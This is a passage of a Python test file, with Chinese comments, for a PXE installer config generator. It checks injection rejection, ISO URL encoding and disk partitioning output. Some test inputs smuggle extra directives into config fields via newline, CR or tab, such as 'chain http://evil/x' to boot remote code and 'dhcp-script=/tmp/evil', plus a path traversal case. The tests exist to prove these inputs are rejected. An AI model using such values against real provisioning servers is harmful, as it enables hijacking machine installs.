            with self.assertRaises(ValidationError, msg="字段 " + field):
                PxeGenerateIn(**{field: "a" + chr(10) + "b"})

    def test_generator_rejects_control_chars(self):
        """第 3 层：绕过 HTTP 层直接调 generate_all，也必须注入不进去。"""
        cases = [
            {"iso_url": self.INJ},
            {"http_root": "http://10.0.0.1" + chr(10) + "dhcp-script=/tmp/evil"},
            {"kernel_path": "vmlinuz" + chr(10) + "chain http://evil/x"},
            {"kernel_console": "console=tty0" + chr(10) + "chain http://evil/x"},
            {"mirror": "http://m/" + chr(10) + "rootpw x"},      # 进 YAML 与 kickstart
            {"timezone": "UTC" + chr(10) + "late-commands:"},     # 进 YAML
            {"iso_url": "http://x/y.iso" + chr(13) + "chain http://evil/x"},  # CR 也要拦
            {"iso_url": "http://x/y.iso" + chr(9) + "chain http://evil/x"},   # TAB 也要拦
        ]
        for kw in cases:
            with self.assertRaises(ValueError, msg=str(kw)):
                generate_all(_cfg(**kw))

    def test_normal_values_not_broken(self):
        """正常值不能被误伤（否则等于用"安全"把功能打死）。"""
        files = generate_all(_cfg())
        self.assertIn("kernel ", files["boot.ipxe"])
        self.assertIn("user-data", files)
        self.assertIn("dhcp-boot=", files["dnsmasq.conf"])

    def test_pick_iso_version_boundary_and_precision(self):
        """版本按数字边界匹配；精度排序要真的生效。"""
        # 边界：查询 9 不能命中 19.4
        names = ["Rocky-19.4-x86_64-minimal.iso", "Rocky-9.4-x86_64-minimal.iso"]
        self.assertEqual(pick_iso(names, "rhel", "9"), "Rocky-9.4-x86_64-minimal.iso")
        # 精度：22.04 与 22.04.5 同时存在时，段数多的胜出
        # （旧实现 score 恒为查询版本的段数，两者平票，这条排序从未生效）
        two = ["ubuntu-22.04-live-server-amd64.iso",
               "ubuntu-22.04.5-live-server-amd64.iso"]
        self.assertEqual(pick_iso(two, "ubuntu", "22.04"),
                         "ubuntu-22.04.5-live-server-amd64.iso")
        # 22.04 的查询不能命中 24.04
        self.assertEqual(pick_iso(["ubuntu-24.04.1-live-server-amd64.iso"],
                                  "ubuntu", "22.04"), "")


class PxeIsoUrlTest(unittest.TestCase):
    """ISO 介质 URL 的编码与安全（外部代码审查提出，已独立复核为真）。"""

    def test_iso_url_percent_encodes_filename(self):
        """文件名含空格/非 ASCII 时必须百分号编码。

        不编码时 iPXE 的 kernel 行会在空格处**断开参数**：url= 只剩前半截，后半截变成
        多余的内核参数，casper 取不到介质 → "Unable to find a medium containing a live file system"。
        """
        from unittest import mock

        from app.api import pxe as api_pxe
        from app.it.pxe import server as pxe_server

        class _P:                       # 最小 profile 替身：_iso_url_for 只读这两个属性
            os_type = "ubuntu"
            os_version = "22.04"

        with mock.patch.object(pxe_server, "iso_names",
                               lambda: ["ubuntu 22.04 live.iso"]):
            url = api_pxe._iso_url_for(_P(), "10.0.0.1")

        self.assertEqual(url, "http://10.0.0.1:8000/pxe/iso/ubuntu%2022.04%20live.iso")
        self.assertNotIn(" ", url, "URL 里不能出现裸空格")
        # 反解回来必须是真实文件名 —— _iso_size_mb 就是靠它去 stat 的
        from urllib.parse import unquote
        self.assertEqual(unquote(url.rsplit("/", 1)[-1]), "ubuntu 22.04 live.iso")

    def test_iso_size_mb_rejects_bad_names(self):
        """空串与路径穿越必须返回 0，不能拿去 stat 任意路径。"""
        from app.api import pxe as api_pxe
        self.assertEqual(api_pxe._iso_size_mb(""), 0)
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/.."), 0)
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/."), 0)
        # 不存在的文件也必须是 0（不能抛）
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/nope-xyz.iso"), 0)


# ==================== 磁盘与分区（方案 C / docs/PARTITION.md） ====================
#
# 这一组测试对应规格 §2/§3/§4/§5/§6。最要紧的两条：
#   · 回归红线 §5.1：disk_config 缺省/空/只有历史键 "disk" 时**逐字不变**（真机验证过的 4 套）；
#   · 反向断言：disk_config={"target":{"mode":"auto"}} 的产物里不许出现字面量 sda。

# 改造前（HEAD）的磁盘行，逐字抄在这里当红线基准。任何"顺手重排注释/空格"都会被它抓住。
LEGACY_KS_LVM = [
    # §5.14 修复：补上 ignoredisk 把"没有 --ondisk 的 part 行"钉在目标盘上（见 generator._rhel_ks）
    "ignoredisk --only-use=sda",
    "clearpart --drives=sda --all --initlabel",
    "part /boot/efi --fstype=efi --size=512",
    "part /boot --fstype=ext4 --size=1024",
    "part pv.01 --size=1 --grow",
    "volgroup vg0 pv.01",
    "logvol / --vgname=vg0 --name=root --size=20480 --fstype=ext4",
    "logvol swap --vgname=vg0 --name=swap --size=8192",
    "logvol /home --vgname=vg0 --name=home --size=10240 --fstype=ext4",
    "bootloader --location=mbr --boot-drive=sda",
]
LEGACY_KS_DIRECT = [
    # §5.14 修复：同上
    "ignoredisk --only-use=sda",
    "clearpart --drives=sda --all --initlabel",
    "part /boot/efi --fstype=efi --size=512",
    "part / --fstype=ext4 --ondisk=sda --grow",
    "part swap --size=8192",
    "bootloader --location=mbr --boot-drive=sda",
]

# 规格 §2 的示例分区表（LVM 那条按澄清补上 mount）
CUSTOM_PARTS = [
    {"mount": "/boot/efi", "size": "512M", "fstype": "fat32"},
    {"mount": "/boot", "size": "1G", "fstype": "ext4"},
    {"mount": "swap", "size": "8G"},
    {"vg": "vg0", "lv": "root", "mount": "/", "size": "rest", "fstype": "ext4"},
]


def _mask_pw(text):
    """sha512_crypt 每次调用盐都不同；比对"逐字不变"之前只 mask 密文本身。"""
    return re.sub(r"\$6\$[^\s'\"]+", "$6$MASK", text)


def _ks_disk_block(ks):
    """取出 ks 主体里 user 行之后、selinux 行之前的磁盘行。"""
    lines = ks.splitlines()
    start = next(i for i, l in enumerate(lines) if l.startswith("user --name=")) + 1
    end = next(i for i, l in enumerate(lines) if l.startswith("selinux "))
    return [l for l in lines[start:end] if l.strip()]


def _ks_main_body(ks):
    """%pre 块与 %include 之外的"主体"行（磁盘行必须已经从这里消失）。"""
    out, in_pre = [], False
    for line in ks.splitlines():
        if line.startswith("%pre"):
            in_pre = True
            continue
        if in_pre:
            if line == "%end":
                in_pre = False
            continue
        if line.startswith("%include"):
            continue
        out.append(line)
    return out


class PxeDiskRegressionTest(unittest.TestCase):
    """回归红线 §5.1：disk_config 缺省/空/只有历史键 "disk" 时逐字不变。"""

    def _rhel(self, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(**kw)

    def test_legacy_ubuntu_storage_line_is_unchanged(self):
        """三个 layout + 历史键 disk 的 storage 行，必须与改造前逐字一致。"""
        cases = [
            ({}, '  storage: {"layout": {"name": "lvm"}}'),
            ({"disk_scheme": "direct"}, '  storage: {"layout": {"name": "direct"}}'),
            ({"disk_scheme": "zfs"}, '  storage: {"layout": {"name": "zfs"}}'),
            # 非法 layout 回退 lvm（既有行为）
            ({"disk_scheme": "unknown-xyz"}, '  storage: {"layout": {"name": "lvm"}}'),
            # 历史键 disk → match.path，且 storage 仍是 layout 简写
            ({"disk_config": {"disk": "vda"}},
             '  storage: {"layout": {"name": "lvm", "match": {"path": "/dev/vda"}}}'),
            # 只有历史键 disk 且为空串时，仍然是 match.path=/dev/（既有行为，不"优化"）
            ({"disk_config": {"disk": ""}},
             '  storage: {"layout": {"name": "lvm", "match": {"path": "/dev/"}}}'),
        ]
        for kw, expected in cases:
            with self.subTest(kw=kw):
                ud = generate_all(_cfg(**kw))["user-data"]
                self.assertIn(expected, ud.splitlines(), ud)

    def test_legacy_rhel_disk_lines_are_unchanged(self):
        """RHEL 三个 layout（zfs 与 lvm 同构）的磁盘行 + bootloader 行逐行不变。"""
        lvm = generate_all(self._rhel(disk_scheme="lvm"))["ks.cfg"]
        self.assertEqual(_ks_disk_block(lvm), LEGACY_KS_LVM)
        zfs = generate_all(self._rhel(disk_scheme="zfs"))["ks.cfg"]
        self.assertEqual(_ks_disk_block(zfs), LEGACY_KS_LVM)
        direct = generate_all(self._rhel(disk_scheme="direct"))["ks.cfg"]
        self.assertEqual(_ks_disk_block(direct), LEGACY_KS_DIRECT)

    def test_legacy_disk_key_only_is_unchanged(self):
        """只有历史键 disk（前端 Pxe.vue 一直只发这个形状）时，除盘名外逐字不变。"""
        ks = generate_all(self._rhel(disk_config={"disk": "nvme0n1"}))["ks.cfg"]
        expect = [l.replace("sda", "nvme0n1") for l in LEGACY_KS_LVM]
        self.assertEqual(_ks_disk_block(ks), expect)
        # 空 dict / 缺省 / {"disk": ""} 的差异也只来自盘名（空串 → --drives= 的形式与旧版一致）
        for dc in (None, {}):
            with self.subTest(dc=dc):
                self.assertEqual(
                    _ks_disk_block(generate_all(self._rhel(disk_config=dc))["ks.cfg"]),
                    LEGACY_KS_LVM,
                )

    def test_legacy_full_files_byte_identical_golden(self):
        """整份 user-data / ks.cfg 的字节级冻结（sha256，取自改造前的 generator）。

        口令密文是随机盐，先 mask。四个用例覆盖 Ubuntu 的 lvm/direct 与 RHEL 的
        lvm/direct，其中两个带历史键 disk —— 只要有一个字节动了，这里就会红。
        """
        # key 用 json 文本（dict 不可哈希）
        # ⚠️ 2026-09-26 重新基线化（用户签核）：§5.14 修复给 **RHEL legacy 路径**加了
        # `ignoredisk --only-use=<disk>`（原来的 part 行大多没有 --ondisk，多盘机器上可能
        # 落到别的盘）。因此两个 RHEL 用例的 sha 变了；**两个 Ubuntu 用例必须保持不变**
        # （本修复只碰 _rhel_ks），这一点已在重算时断言过。
        # 重新基线化的前提是真机验收已通过：VM140（scsi0/sdb 两块盘）走 legacy 路径装机，
        # 分区动作只在 /dev/sda、非目标盘 sdb 开头 1MiB 逐字节未变、从 sda 起到登录提示。
        golden = {
            '["ubuntu","lvm",null]':
                "6680721c74a9cefc63bdba945daa035dbf199ad6ca312c2c180ab86a64e8931a",
            '["ubuntu","direct",{"disk":"vda"}]':
                "f7d357d3c69052f5f4abab66dc4428b0cc368a849cafb76c8104901022223346",
            '["rhel","lvm",null]':
                "bd1ff9342dbab0632fef9e7cf16dcebd393d65a19822395e75a80accb3a4d6cf",
            '["rhel","direct",{"disk":"nvme0n1"}]':
                "43130dfeff8ac52adbe2be45de0a611e0341a5039e8ab1764e726e87fceb402a",
        }
        cases = [
            ("ubuntu", "lvm", None),
            ("ubuntu", "direct", {"disk": "vda"}),
            ("rhel", "lvm", None),
            ("rhel", "direct", {"disk": "nvme0n1"}),
        ]
        for os_type, scheme, dc in cases:
            key = json.dumps([os_type, scheme, dc], separators=(",", ":"))
            with self.subTest(case=key):
                cfg = _cfg(os_type=os_type, disk_scheme=scheme, disk_config=dc,
                           mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
                files = generate_all(cfg)
                name = "user-data" if os_type == "ubuntu" else "ks.cfg"
                got = hashlib.sha256(_mask_pw(files[name]).encode()).hexdigest()
                self.assertEqual(got, golden[key], name)


class PxeDiskSizeTest(unittest.TestCase):
    """规格 §6：尺寸单位转换（512M/20G/rest/100%FREE → bytes 或 rest）。"""

    def test_converter(self):
        from app.it.pxe.generator import _human_size_to_bytes, _size_mb
        self.assertEqual(_human_size_to_bytes("512M"), 536870912)
        self.assertEqual(_human_size_to_bytes("20G"), 21474836480)
        self.assertEqual(_human_size_to_bytes("1.5G"), 1610612736)
        self.assertEqual(_human_size_to_bytes("1T"), 1099511627776)
        # rest / 100%FREE 语义相同（都是"吃掉剩余空间"），subiquity 只认 "rest"
        self.assertEqual(_human_size_to_bytes("rest"), "rest")
        self.assertEqual(_human_size_to_bytes("100%FREE"), "rest")
        self.assertIsInstance(_human_size_to_bytes("512M"), int)
        # kickstart 侧要整数 MB
        self.assertEqual(_size_mb("512M"), 512)
        self.assertEqual(_size_mb("20G"), 20480)
        self.assertIsNone(_size_mb("rest"))

    def test_converter_rejects_junk(self):
        from app.it.pxe.generator import _human_size_to_bytes
        for bad in ("10GB", "M512", "-1G", "rest2", "512", "", "1 G", "1e3M"):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    _human_size_to_bytes(bad)


class PxeCustomLayoutTest(unittest.TestCase):
    """规格 §3.4 / §6：自定义分区在两边逐行生成。"""

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_ubuntu_custom_storage_config(self):
        """EFI+boot+swap+LVM root(rest) 的 storage.config 逐条断言。"""
        dc = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": CUSTOM_PARTS}
        doc = yaml.safe_load(generate_all(_cfg(disk_config=dc))["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertEqual(storage["version"], 1)
        self.assertEqual(storage["config"], [
            {"type": "disk", "id": "disk0", "path": "/dev/sda", "wipe": "superblock",
             # §5.46：grub_device 必需（漏了会报 did not create needed bootloader
             # partition）；有 ESP 用 gpt，没有则 msdos(与 RHEL 侧 MBR 一致)
             "grub_device": True, "ptable": "gpt"},
            {"type": "partition", "id": "part0", "device": "disk0",
             "size": 536870912, "flag": "esp"},
            {"type": "format", "id": "fmt0", "volume": "part0", "fstype": "fat32"},
            {"type": "partition", "id": "part1", "device": "disk0",
             "size": 1073741824, "flag": "boot"},
            {"type": "format", "id": "fmt1", "volume": "part1", "fstype": "ext4"},
            {"type": "partition", "id": "part2", "device": "disk0", "size": 8589934592},
            {"type": "format", "id": "fmt2", "volume": "part2", "fstype": "swap"},
            # §5.45：subiquity 不接受 "rest"，占满剩余空间要用 -1（真机实测 "is not valid input"）
            {"type": "partition", "id": "part3", "device": "disk0", "size": -1},
            {"type": "lvm_volgroup", "id": "vg0", "name": "vg0", "devices": ["part3"]},
            {"type": "lvm_partition", "id": "lv0", "volgroup": "vg0", "name": "root",
             "size": -1},
            {"type": "format", "id": "fmt3", "volume": "lv0", "fstype": "ext4"},
            {"type": "mount", "id": "mnt0", "device": "fmt0", "path": "/boot/efi"},
            {"type": "mount", "id": "mnt1", "device": "fmt1", "path": "/boot"},
            {"type": "mount", "id": "mnt2", "device": "fmt3", "path": "/"},
        ])

    def test_rhel_custom_ks_lines_name_mode(self):
        """显式盘名：Python 侧直接输出，逐行断言。"""
        dc = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": CUSTOM_PARTS}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertEqual(_ks_disk_block(ks), [
            "ignoredisk --only-use=sda",
            "clearpart --drives=sda --all --initlabel",
            "part /boot/efi --fstype=efi --ondisk=sda --size=512",
            "part /boot --fstype=ext4 --ondisk=sda --size=1024",
            "part swap --fstype=swap --ondisk=sda --size=8192",
            "part pv.01 --ondisk=sda --grow",
            "volgroup vg0 pv.01",
            "logvol / --vgname=vg0 --name=root --size=1 --grow --fstype=ext4",
            # UEFI 也是 mbr：GRUB2 不接受 --location=partition（VM141/OVMF 真机实证）
            "bootloader --location=mbr --boot-drive=sda",
        ])

    def test_rhel_custom_ks_lines_non_efi_is_mbr(self):
        """没有 ESP 的自定义分区表 ⇒ BIOS ⇒ --location=mbr。"""
        dc = {"target": {"mode": "name", "name": "vda"}, "layout": "custom",
              "partitions": [{"mount": "/", "size": "rest", "fstype": "xfs"}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertEqual(_ks_disk_block(ks), [
            "ignoredisk --only-use=vda",
            "clearpart --drives=vda --all --initlabel",
            "part / --fstype=xfs --ondisk=vda --grow",
            "bootloader --location=mbr --boot-drive=vda",
        ])

    def test_ubuntu_custom_rejects_auto_without_disk(self):
        """subiquity 的 storage.config 没有"自动挑最大盘"的写法，必须显式失败而不是写死 sda。"""
        dc = {"target": {"mode": "auto"}, "layout": "custom", "partitions": CUSTOM_PARTS}
        with self.assertRaises(ValueError) as cm:
            generate_all(_cfg(disk_config=dc))
        self.assertIn("custom", str(cm.exception))

    def test_efi_and_swap_fstype_are_forced(self):
        """§2：/boot/efi 强制 fat32，swap 挂载点强制 swap（哪怕调用方写错了）。"""
        dc = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": [{"mount": "/boot/efi", "size": "512M", "fstype": "ext4"},
                             {"mount": "swap", "size": "8G", "fstype": "xfs"},
                             {"mount": "/", "size": "rest", "fstype": "ext4"}]}
        doc = yaml.safe_load(generate_all(_cfg(disk_config=dc))["user-data"])
        cfg = doc["autoinstall"]["storage"]["config"]
        fstypes = [c["fstype"] for c in cfg if c["type"] == "format"]
        self.assertIn("fat32", fstypes)
        self.assertIn("swap", fstypes)
        self.assertNotIn("ext4", [c["fstype"] for c in cfg
                                  if c["type"] == "format" and c.get("volume") == "part0"])


class PxeAutoDiskTest(unittest.TestCase):
    """规格 §3.1 + §6：自动选盘，以及"产物里不许再有 sda"的反向断言。"""

    AUTO = {"target": {"mode": "auto"}}

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_ubuntu_auto_uses_largest(self):
        doc = yaml.safe_load(generate_all(_cfg(disk_config=self.AUTO))["user-data"])
        layout = doc["autoinstall"]["storage"]["layout"]
        self.assertEqual(layout["name"], "lvm")
        self.assertEqual(layout["match"], {"size": "largest"})

    def test_ubuntu_auto_min_size_is_accepted(self):
        """min_size_gb 在 subiquity 侧表达不了下限（文档注明），但不能因此报错。"""
        doc = yaml.safe_load(
            generate_all(_cfg(disk_config={"target": {"mode": "auto", "min_size_gb": 20}}))["user-data"]
        )
        self.assertEqual(doc["autoinstall"]["storage"]["layout"]["match"], {"size": "largest"})

    def test_rhel_auto_uses_pre_and_include(self):
        """ks 没有"自动选盘"原语：必须 %pre 现场生成 /tmp/disk.ks 再 %include。"""
        ks = generate_all(self._rhel(self.AUTO))["ks.cfg"]
        self.assertIn("%pre --interpreter=/bin/bash --log=/tmp/pre-disk.log", ks)
        self.assertIn("%include /tmp/disk.ks", ks)
        self.assertIn("cat > /tmp/disk.ks <<EOF", ks)
        self.assertIn("ignoredisk --only-use=$target", ks)
        self.assertIn("clearpart --drives=$target --all --initlabel", ks)
        self.assertIn("lsblk", ks)
        # 磁盘行必须**全部**搬进片段：主体里一条都不许留（否则重复声明）
        for line in _ks_main_body(ks):
            self.assertFalse(line.startswith(("clearpart", "part ", "volgroup", "logvol",
                                              "raid ", "bootloader", "ignoredisk")), line)
        # 片段里不能残留任何写死的盘名
        self.assertNotIn("sda", ks)

    def test_rhel_auto_custom_bootloader_is_mbr_regardless_of_firmware(self):
        """bootloader 一律 mbr —— **不能**按固件分支成 partition。

        原规格 §3.2 让 UEFI 走 `--location=partition`，真机（VM141 / OVMF）实测被 anaconda 拒绝：
            GRUB2 does not support installation to a partition.
            The installer will now terminate.
        `partition` 是 syslinux 时代的写法；RHEL 8+ 的 GRUB2 不接受。UEFI 下写 mbr 时
        anaconda 会自己把 grub2-efi/shim 装进 ESP。这条测试就是钉住这个结论，
        防止有人"好心"再把固件分支加回来。
        """
        dc = dict(self.AUTO, layout="custom", partitions=CUSTOM_PARTS)
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertNotIn("/sys/firmware/efi", ks)
        self.assertNotIn("--location=partition", ks)
        self.assertNotIn("--location=$loc", ks)
        self.assertIn("bootloader --location=mbr --boot-drive=$target", ks)
        self.assertIn("cat > /tmp/disk.ks <<EOF", ks)
        self.assertIn("%include /tmp/disk.ks", ks)
        for line in _ks_main_body(ks):
            self.assertFalse(line.startswith(("clearpart", "part ", "volgroup", "logvol",
                                              "raid ", "bootloader", "ignoredisk")), line)
        # 注意：CUSTOM_PARTS 里本来就带 /boot/efi，所以上面这份 ks 正是真机挂掉的那一种配置
        # （不用再拼一个带 ESP 的变体 —— 拼了会因为"两个 /boot/efi"被校验正当拒绝）。
        # 非自定义分区路径同样是 mbr
        ks_lvm = generate_all(self._rhel(self.AUTO))["ks.cfg"]
        self.assertIn("bootloader --location=mbr --boot-drive=$target", ks_lvm)

    def test_auto_ignores_target_name(self):
        """§2：mode=auto 必须忽略 name（避免"以为自动其实写死"）。"""
        for os_type in ("ubuntu", "rhel"):
            with self.subTest(os_type=os_type):
                files = generate_all(self._rhel(
                    {"target": {"mode": "auto", "name": "sda"}}, os_type=os_type))
                blob = "\n".join(files.values())
                self.assertNotIn("sda", blob)

    def test_reverse_assertion_no_sda_literal(self):
        """§6 反向断言：disk_config={"target":{"mode":"auto"}} 的产物里 grep -c 'sda' == 0。"""
        cases = [
            _cfg(disk_config={"target": {"mode": "auto"}}),
            self._rhel({"target": {"mode": "auto"}}),
            # 自定义分区表 + 自动选盘（RHEL 走 %pre；Ubuntu 这条路径显式报错）
            self._rhel({"target": {"mode": "auto"}, "layout": "custom",
                        "partitions": CUSTOM_PARTS}),
        ]
        for cfg in cases:
            with self.subTest(os_type=cfg.os_type):
                blob = "\n".join(generate_all(cfg).values())
                self.assertEqual(blob.count("sda"), 0, blob)

    def test_rhel_match_mode_resolves_serial_in_pre(self):
        """match 模式同样由 %pre 现场解析（lsblk 按 SERIAL/MODEL 找盘）。"""
        ks = generate_all(self._rhel(
            {"target": {"mode": "match", "serial": "S3Z1NB0K123456"}}))["ks.cfg"]
        self.assertIn("awk -v s='S3Z1NB0K123456'", ks)
        self.assertIn("%include /tmp/disk.ks", ks)
        self.assertNotIn("sda", ks)

    def test_min_size_gb_is_used_in_pre(self):
        """下限走 awk 的 -v min=<字节>（不再按列位置 $5 取 SIZE，见 PxeAutoDiskTest 的
        test_lsblk_is_parsed_by_key_not_by_column：空列会让位置取值整体左移）。"""
        ks = generate_all(self._rhel(
            {"target": {"mode": "auto", "min_size_gb": 20}}))["ks.cfg"]
        self.assertIn("-v min=21474836480", ks)
        self.assertIn('gv(L, "SIZE") + 0 < min', ks)


class PxeRaidAndDataDiskTest(unittest.TestCase):
    """规格 §2/§3.3/§3.4：RAID 与"默认不碰"的数据盘。"""

    RAID_DC = {
        "target": {"mode": "match", "serial": "S3Z1NB0K123456"},
        "layout": "custom",
        "partitions": [
            {"mount": "/boot/efi", "size": "512M"},
            {"mount": "swap", "size": "4G"},
            {"size": "10G", "fstype": "xfs"},
            {"size": "10G", "fstype": "xfs"},
            {"mount": "/", "size": "rest", "fstype": "ext4"},
        ],
        "raid": [{"name": "md0", "level": 1, "devices": ["part.03", "part.04"],
                  "mount": "/data", "fstype": "xfs"}],
        "data_disks": [{"name": "sdc", "size": "30G", "fstype": "xfs"}],
    }

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_ubuntu_raid_and_data_disk(self):
        doc = yaml.safe_load(generate_all(_cfg(disk_config=self.RAID_DC))["user-data"])
        cfg = doc["autoinstall"]["storage"]["config"]
        raid = [c for c in cfg if c["type"] == "raid"]
        self.assertEqual(raid, [{"type": "raid", "id": "md0", "name": "md0", "raidlevel": 1,
                                 "devices": ["part2", "part3"]}])
        # RAID 成员自身不建文件系统
        self.assertEqual([c["volume"] for c in cfg if c["type"] == "format"],
                         ["part0", "part1", "part4", "md0"])
        # 目标盘走 serial（§3.1 match 模式）；数据盘 sdc 没有 wipe → 完全不碰
        disk = [c for c in cfg if c["type"] == "disk"]
        self.assertEqual(disk, [{"type": "disk", "id": "disk0",
                                 "serial": "S3Z1NB0K123456", "wipe": "superblock",
                                 "grub_device": True, "ptable": "gpt"}])
        self.assertNotIn("sdc", json.dumps(cfg))

    def test_rhel_raid_and_data_disk_not_touched(self):
        ks = generate_all(self._rhel(self.RAID_DC))["ks.cfg"]
        block = _ks_disk_block(ks)
        # 该盘在 %pre 片段里 —— 取片段内容做断言
        fragment = ks.split("cat > /tmp/disk.ks <<EOF\n", 1)[1].split("\nEOF", 1)[0].splitlines()
        self.assertIn("raid /data --level=1 --device=md0 --fstype=xfs raid.01 raid.02", fragment)
        self.assertIn("part raid.01 --ondisk=$target --size=10240", fragment)
        self.assertIn("part raid.02 --ondisk=$target --size=10240", fragment)
        # 数据盘默认 wipe=false ⇒ 只声明"别碰它"，绝无 clearpart/part。
        # 声明方式是"不被 --only-use 列出"，而**不是**再发一条 ignoredisk --drives=sdc：
        # 两条 ignoredisk 会让 pykickstart 直接报
        #   "One of --drives or --only-use must be specified"（见 test_exactly_one_ignoredisk_line）。
        self.assertIn("ignoredisk --only-use=$target", fragment)
        self.assertFalse([l for l in fragment if l.startswith("ignoredisk") and "sdc" in l], fragment)
        self.assertNotIn("clearpart --drives=$target,sdc", fragment)
        self.assertNotIn("part /backup", fragment)
        # 主体里没有磁盘行（磁盘行只在 %pre 片段里）
        for line in _ks_main_body(ks):
            self.assertFalse(line.startswith(("clearpart", "part ", "volgroup", "logvol",
                                              "raid ", "bootloader", "ignoredisk")), line)

    def test_data_disk_wipe_defaults_false(self):
        """生产红线：data_disks[].wipe 缺省必须是 false。"""
        from app.it.pxe.generator import _disk_plan
        plan = _disk_plan(_cfg(disk_config=self.RAID_DC), self.RAID_DC)
        self.assertEqual(plan["data_disks"], [
            {"name": "sdc", "mount": "", "fstype": "xfs", "wipe": False,
             # §5.42：稳定匹配条件必须随 plan 一起带下去，否则 %pre 拿不到，
             # 排除集为空 → 又退回"按名字排除"那条会抹盘的老路。
             "size": "30G", "serial": "", "wwid": ""}])
        # target 的 wipe 缺省是 true（装系统的盘本来就要清）
        self.assertTrue(plan["wipe"])

    def test_data_disk_wipe_true_gets_cleared_and_mounted(self):
        dc = dict(self.RAID_DC, data_disks=[{"name": "sdc", "size": "30G", "mount": "/backup",
                                             "fstype": "xfs", "wipe": True}])
        fragment = generate_all(self._rhel(dc))["ks.cfg"].split(
            "cat > /tmp/disk.ks <<EOF\n", 1)[1].split("\nEOF", 1)[0]
        self.assertIn("clearpart --drives=$target,$ddev1 --all --initlabel", fragment)
        self.assertIn("part /backup --fstype=xfs --size=1 --grow --ondisk=$ddev1", fragment)
        self.assertNotIn("ignoredisk --drives=sdc", fragment)

    def test_wipe_false_target_does_not_clearpart(self):
        dc = dict(self.RAID_DC, wipe=False)
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        # 只允许注释里出现 clearpart（说明"未执行"），不能有真的 clearpart 命令
        for line in ks.splitlines():
            self.assertFalse(line.startswith("clearpart"), line)
        self.assertIn("wipe=false", ks)

    def test_exactly_one_ignoredisk_line(self):
        """一份 ks 里只能有一条 ignoredisk —— 否则 anaconda 直接读不进去。

        实测（pykickstart 3.78 / RHEL9，本地真解析）：`ignoredisk --only-use=sda` 之后再写
        `ignoredisk --drives=sdc`，第二行抛
            KickstartParseError: One of --drives or --only-use must be specified for ignoredisk command.
        （F8_IgnoreDisk.parse 累积两条状态后 howmany != 1）。旧实现在"数据盘默认 wipe=false"时
        就会发第二条，也就是**配了数据盘的 RHEL custom 模板生成出来的 ks 装不了**。
        """
        cases = [
            self.RAID_DC,                                        # 数据盘 wipe 缺省 false
            dict(self.RAID_DC, data_disks=[{"name": "sdc", "size": "30G", "mount": "/backup",
                                            "fstype": "xfs", "wipe": True}]),
            dict(self.RAID_DC, layout="custom", target={"mode": "name", "name": "sda"}),
        ]
        for dc in cases:
            with self.subTest(dc=dc):
                ks = generate_all(self._rhel(dc))["ks.cfg"]
                found = [l for l in ks.splitlines() if l.startswith("ignoredisk")]
                self.assertEqual(len(found), 1, found)
                self.assertTrue(found[0].startswith("ignoredisk --only-use="), found[0])
        # wipe=true 的数据盘必须在 --only-use 里（它要被 clearpart 并建分区）
        ks = generate_all(self._rhel(cases[1]))["ks.cfg"]
        self.assertIn("ignoredisk --only-use=$target,$ddev1", ks)

    def test_raid_devices_accept_three_id_spellings(self):
        """§3.3 的 part.01、subiquity 的 part0、§2 示例的 sdaN 都折算到同一套"第 N 个分区"。

        注意用 sdb3 而不是 sdc3：sdc 在本用例里是数据盘，把某个 RAID 成员的盘名前缀写成
        数据盘是自相矛盾（有 test_raid_member_disk_prefix_must_not_be_a_data_disk 钉住）。
        """
        from app.it.pxe.generator import _disk_plan
        for spelling in ("part.03", "part2", "sdb3"):
            with self.subTest(spelling=spelling):
                dc = dict(self.RAID_DC)
                dc["raid"] = [{"name": "md0", "level": 1, "devices": [spelling, "part.04"],
                               "mount": "/data", "fstype": "xfs"}]
                plan = _disk_plan(_cfg(disk_config=dc), dc)
                self.assertEqual(plan["raid"][0]["member_indexes"], [2, 3])


def _assert_disk_config_rejected(case, dc, needle, os_type="ubuntu"):
    """两层都必须拒绝，且错误文本里点名到字段路径。

    第 2 层 = schemas（HTTP 入口 → 422）；第 3 层 = generator._disk_plan（绕过 HTTP 直接调用）。
    """
    from pydantic import ValidationError

    from app.core.schemas import PxeProfileIn
    with case.assertRaises(ValidationError) as cm:
        PxeProfileIn(name="x", os_type=os_type, disk_config=dc)
    errs = cm.exception.errors()
    blob = " | ".join(e["msg"] for e in errs) + " " + " ".join(
        ".".join(str(x) for x in e["loc"]) for e in errs)
    case.assertIn(needle, blob, "schemas 层没点名字段：" + blob)
    from app.it.pxe.generator import _disk_plan
    with case.assertRaises(ValueError) as cm2:
        _disk_plan(_cfg(os_type=os_type), dc)
    case.assertIn(needle, str(cm2.exception), "generator 层没点名字段")


class PxeAutoTargetExclusionTest(unittest.TestCase):
    """缺陷 #1：auto 选盘必须先排除 data_disks —— 否则"小系统盘 + 大数据盘"会选中数据盘并抹掉它。"""

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
